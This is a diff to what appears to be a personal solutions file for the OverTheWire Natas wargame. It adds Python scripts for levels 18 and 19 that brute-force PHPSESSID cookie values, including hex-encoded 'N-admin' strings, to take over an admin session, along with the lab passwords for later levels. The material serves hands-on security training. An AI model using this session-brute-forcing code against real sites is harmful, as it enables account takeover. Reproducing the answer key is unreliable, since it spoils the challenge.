@@ -160,6 +160,59 @@ PAROLA: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
 
 LEVEL_17: http://natas18.natas.labs.overthewire.org natas18 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
 
+import requests
+
+base_url = "http://natas18.natas.labs.overthewire.org/index.php?debug"
+auth_username = "natas18"
+auth_password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"
+
+for i in range(640):
+    headers = {"Cookie": "PHPSESSID={0}".format(i)}
+    payload = {"username": "any", "password": "any"}
+    r = requests.post(base_url, auth=(auth_username, auth_password), headers=headers, data=payload)
+    if "You are logged in as a regular user" not in r.text:
+        print("PHPSESSID={0} : Failed".format(i))
+    else:
+        print("PHPSESSID={0} : Success".format(i))
+        print(r.text)
+        break
+
+print("Test complete.")
+
+PAROLA: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+
+LEVEL_18: http://natas19.natas.labs.overthewire.org natas19 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+
+import requests
+import binascii
+
+base_url = "http://natas19.natas.labs.overthewire.org/index.php"
+auth_username = "natas19"
+auth_password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
+
+for i in range(640):
+    plainstr = "{0}-admin".format(i)
+    hexstr = binascii.hexlify(plainstr.encode())
+    hexstr = hexstr.decode()
+    print("Encoded String {0} -> {1}".format(plainstr, hexstr))
+    headers = {"Cookie": "PHPSESSID={0}".format(hexstr)}
+    payload = {"username": "any", "password": "any"}
+    r = requests.post(base_url, auth=(auth_username, auth_password), headers=headers, data=payload)
+    if "You are logged in as a regular user" in r.text:
+        print("PHPSESSID={0} : Failed".format(i))
+    else:
+        print("PHPSESSID={0} : Success".format(i))
+        print(r.text)
+        break
+
+print("Test complete.")
+
+PAROLA: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
+
+LEVEL_19 http://natas20.natas.labs.overthewire.org natas20 guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
+
+
+
 
 
 
